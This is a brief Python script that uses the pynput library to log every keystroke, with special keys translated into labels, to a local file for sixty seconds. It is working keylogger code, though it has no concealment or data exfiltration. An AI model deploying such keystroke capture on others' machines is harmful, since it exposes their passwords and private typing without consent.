from pynput.keyboard import Listener, Key
from datetime import datetime, timedelta

special_keys = {
    "Key.alt": "[alt]",
    "Key.alt_l": "[alt_left]",
    "Key.alt_r": "[alt_right]",
    "Key.backspace": "[backspace]",
    "Key.caps_lock": "[capslock]",
    "Key.cmd": "[cmd]",
    "Key.cmd_l": "[cmd_left]",
    "Key.cmd_r": "[cmd_right]",
    "Key.ctrl": "[ctrl]",
    "Key.ctrl_l": "[ctrl_left]",
    "Key.ctrl_r": "[ctrl_right]",
    "Key.delete": "[delete]",
    "Key.down": "[down]",
    "Key.end": "[end]",
    "Key.enter": "[enter]",
    "Key.esc": "[escape]",
    "Key.f1": "[f1]",
    "Key.f2": "[f2]",
    "Key.f3": "[f3]",
    "Key.f4": "[f4]",
    "Key.f5": "[f5]",
    "Key.f6": "[f6]",
    "Key.f7": "[f7]",
    "Key.f8": "[f8]",
    "Key.f9": "[f9]",
    "Key.f10": "[f10]",
    "Key.f11": "[f11]",
    "Key.f12": "[f12]",
    "Key.home": "[home]",
    "Key.insert": "[insert]",
    "Key.left": "[left]",
    "Key.page_down": "[page_down]",
    "Key.page_up": "[page_up]",
    "Key.right": "[right]",
    "Key.shift": "[shift]",
    "Key.shift_l": "[shift_left]",
    "Key.shift_r": "[shift_right]",
    "Key.space": "[space]",
    "Key.tab": "[tab]",
    "Key.up": "[up]",
    "<97>":"1",
    "<98>":"2",
    "<99>":"3",
    "<100>":"4",
    "<101>":"5",
    "<102>":"6",
    "<103>":"7",
    "<104>":"8",
    "<105>":"9"
}

def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]

    with open("hello.txt", "a") as f:
        f.write(listen)

stat = datetime.now()
end = stat + timedelta(seconds=60)
def on_release(key):
    if datetime.now() >=  end:
        return False
    return None

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
